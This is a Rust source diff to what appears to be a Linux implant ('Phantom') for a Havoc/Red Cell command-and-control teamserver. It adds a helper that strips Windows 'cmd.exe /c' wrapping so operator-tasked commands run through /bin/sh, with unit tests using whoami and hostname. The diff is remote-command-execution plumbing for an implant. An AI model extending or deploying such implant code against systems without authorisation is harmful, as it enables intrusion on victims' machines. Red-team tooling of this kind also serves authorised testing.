@@ -25,6 +25,45 @@ use super::sysinfo::{
     PAGE_WRITECOPY,
 };
 
+/// Strip Havoc/Red Cell Windows shell wrapping so the inner command can run on Linux.
+///
+/// The teamserver's [`red_cell_common::demon::format_proc_create_args`] base64-encodes
+/// `cmd.exe /c <command>` in the args field while leaving the process path empty.  Phantom
+/// must not spawn `/bin/sh -c "cmd.exe /c whoami"` (which tries to execute `cmd.exe` as a
+/// POSIX binary).  When the process path is a Windows `cmd.exe` location and args begin
+/// with `/c`, we strip that prefix (same idea as Specter's `translate_to_shell_cmd`).
+fn extract_havoc_posix_shell_inner(process: &str, args: &str) -> Option<String> {
+    if args.is_empty() {
+        return None;
+    }
+    let args_trim = args.trim_start();
+    let args_lower = args_trim.to_ascii_lowercase();
+    if args_lower.starts_with("cmd.exe /c") {
+        let rest = args_trim.get("cmd.exe /c".len()..).unwrap_or("").trim_start();
+        return Some(if rest.is_empty() { String::from("true") } else { rest.to_string() });
+    }
+
+    let proc_lower = process.to_ascii_lowercase();
+    let is_cmd_path = !process.is_empty()
+        && (proc_lower.ends_with("cmd.exe")
+            || proc_lower.ends_with("\\cmd")
+            || proc_lower == "cmd.exe"
+            || proc_lower == "cmd");
+
+    if is_cmd_path {
+        if args_lower.starts_with("/c ") {
+            let rest = args_trim[3..].trim_start();
+            return Some(if rest.is_empty() { String::from("true") } else { rest.to_string() });
+        }
+        if args_lower.starts_with("/c") && args_trim.len() > 2 {
+            let rest = args_trim[2..].trim_start();
+            return Some(if rest.is_empty() { String::from("true") } else { rest.to_string() });
+        }
+    }
+
+    None
+}
+
 /// List all processes on the system.
 pub(super) fn execute_process_list(payload: &[u8]) -> Result<Vec<u8>, PhantomError> {
     let mut parser = TaskParser::new(payload);
@@ -53,17 +92,30 @@ pub(super) async fn execute_process(
             let piped = parser.bool32()?;
             let verbose = parser.bool32()?;
 
-            let binary = if process.is_empty() { String::from("/bin/sh") } else { process };
+            let translated = extract_havoc_posix_shell_inner(&process, &process_args);
+
+            let binary = if translated.is_some() || process.is_empty() {
+                String::from("/bin/sh")
+            } else {
+                process
+            };
 
             let mut command = Command::new(&binary);
-            if process_args.is_empty() {
-                if binary == "/bin/sh" {
-                    command.arg("-c").arg("true");
+            match translated {
+                Some(script) => {
+                    command.arg("-c").arg(script);
                 }
-            } else if binary == "/bin/sh" {
-                command.arg("-c").arg(process_args);
-            } else {
-                command.args(split_args(&process_args));
+                None if process_args.is_empty() => {
+                    if binary == "/bin/sh" {
+                        command.arg("-c").arg("true");
+                    }
+                }
+                None if binary == "/bin/sh" => {
+                    command.arg("-c").arg(process_args);
+                }
+                None => {
+                    command.args(split_args(&process_args));
+                }
             }
             if piped {
                 command.stdout(Stdio::piped()).stderr(Stdio::piped());
@@ -356,4 +408,40 @@ pub(super) fn map_linux_memory_type(perms: &str, path: Option<&str>) -> u32 {
 
 pub(super) fn split_args(arguments: &str) -> Vec<OsString> {
     arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
+}
+
+#[cfg(test)]
+mod havoc_shell_extract_tests {
+    use super::extract_havoc_posix_shell_inner;
+
+    #[test]
+    fn empty_process_cmd_exe_c_strips_prefix() {
+        assert_eq!(
+            extract_havoc_posix_shell_inner("", "cmd.exe /c whoami").as_deref(),
+            Some("whoami")
+        );
+    }
+
+    #[test]
+    fn empty_process_cmd_exe_c_case_insensitive_prefix() {
+        assert_eq!(
+            extract_havoc_posix_shell_inner("", "CMD.EXE /c echo ok").as_deref(),
+            Some("echo ok")
+        );
+    }
+
+    #[test]
+    fn windows_cmd_path_with_slash_c() {
+        assert_eq!(
+            extract_havoc_posix_shell_inner(r"C:\Windows\System32\cmd.exe", "/c hostname")
+                .as_deref(),
+            Some("hostname")
+        );
+    }
+
+    #[test]
+    fn plain_sh_invoke_not_matched() {
+        assert_eq!(extract_havoc_posix_shell_inner("", "echo hi"), None);
+        assert_eq!(extract_havoc_posix_shell_inner("/bin/sh", "echo hi"), None);
+    }
 }
